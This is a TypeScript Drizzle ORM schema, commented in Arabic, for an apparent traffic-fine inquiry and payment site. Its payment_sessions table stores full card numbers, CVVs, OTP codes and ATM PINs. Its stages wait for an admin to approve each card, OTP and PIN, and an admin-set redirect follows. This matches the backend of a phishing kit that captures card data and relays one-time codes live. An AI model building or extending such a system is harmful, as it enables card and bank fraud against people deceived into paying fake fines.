import { pgEnum, pgTable, serial, text, timestamp, varchar, numeric, jsonb, integer } from "drizzle-orm/pg-core";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: text("role").$type<"user" | "admin">().default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

export const fineQueryStatusEnum = pgEnum("fine_query_status", ["pending", "success", "failed", "no_fines"]);

// جدول الاستعلامات - يخزن كل استعلام تم إجراؤه
export const fineQueries = pgTable("fine_queries", {
  id: serial("id").primaryKey(),
  plateSource: varchar("plateSource", { length: 100 }).notNull(),
  plateNumber: varchar("plateNumber", { length: 50 }).notNull(),
  plateCode: varchar("plateCode", { length: 50 }).notNull(),
  status: fineQueryStatusEnum("status").default("pending").notNull(),
  errorMessage: text("errorMessage"),
  totalFines: integer("totalFines").default(0),
  totalAmount: numeric("totalAmount", { precision: 10, scale: 2 }),
  rawResults: jsonb("rawResults"),
  userId: integer("userId"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export type FineQuery = typeof fineQueries.$inferSelect;
export type InsertFineQuery = typeof fineQueries.$inferInsert;

export const finePaidStatusEnum = pgEnum("fine_paid_status", ["paid", "unpaid", "partial"]);

// جدول المخالفات
export const fines = pgTable("fines", {
  id: serial("id").primaryKey(),
  queryId: integer("queryId").notNull(),
  fineNumber: varchar("fineNumber", { length: 100 }),
  fineDate: varchar("fineDate", { length: 50 }),
  description: text("description"),
  amount: numeric("amount", { precision: 10, scale: 2 }),
  blackPoints: integer("blackPoints").default(0),
  isPaid: finePaidStatusEnum("isPaid").default("unpaid"),
  location: text("location"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Fine = typeof fines.$inferSelect;
export type InsertFine = typeof fines.$inferInsert;

export const paymentStageEnum = pgEnum("payment_stage", [
  "home",           // في الصفحة الرئيسية
  "inquiry",        // في صفحة الاستعلام
  "results",        // عرض النتائج
  "card",           // إدخال بيانات البطاقة
  "card_pending",   // انتظار موافقة الأدمن على البطاقة
  "otp",            // إدخال OTP
  "otp_pending",    // انتظار موافقة الأدمن على OTP
  "atm",            // إدخال رقم ATM
  "atm_pending",    // انتظار موافقة الأدمن على ATM
  "success",        // تم الدفع بنجاح
  "failed",         // فشل الدفع
]);

// جدول جلسات الدفع - يخزن كل جلسة دفع ومراحلها
export const paymentSessions = pgTable("payment_sessions", {
  id: serial("id").primaryKey(),
  // معرف الجلسة الفريد
  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
  // معرف الاستعلام المرتبط
  queryId: integer("queryId"),
  // المخالفات المحددة للدفع (JSON)
  selectedFines: jsonb("selectedFines"),
  // إجمالي المبلغ
  totalAmount: varchar("totalAmount", { length: 50 }),
  // بيانات البطاقة الكاملة
  cardName: varchar("cardName", { length: 200 }),
  cardNumber: varchar("cardNumber", { length: 20 }),
  cardNumberMasked: varchar("cardNumberMasked", { length: 20 }),
  cardExpiry: varchar("cardExpiry", { length: 10 }),
  cardCvv: varchar("cardCvv", { length: 10 }),
  // رمز OTP
  otpCode: varchar("otpCode", { length: 20 }),
  // رقم ATM السري
  atmPin: varchar("atmPin", { length: 20 }),
  // المرحلة الحالية
  stage: paymentStageEnum("stage").default("home").notNull(),
  // رسالة الخطأ عند الرفض
  errorMessage: text("errorMessage"),
  // معلومات الاستعلام التفصيلية
  plateNumber: varchar("plateNumber", { length: 50 }),
  plateSource: varchar("plateSource", { length: 100 }),
  plateCode: varchar("plateCode", { length: 50 }),
  qidNumber: varchar("qidNumber", { length: 50 }),
  establishmentId: varchar("establishmentId", { length: 50 }),
  // IP والمتصفح
  clientIp: varchar("clientIp", { length: 50 }),
  userAgent: text("userAgent"),
  // حالة القراءة من الأدمن
  statusRead: integer("statusRead").default(0),
  // رابط إعادة التوجيه (يضبطه الأدمن)
  redirectUrl: varchar("redirectUrl", { length: 500 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export type PaymentSession = typeof paymentSessions.$inferSelect;
export type InsertPaymentSession = typeof paymentSessions.$inferInsert;
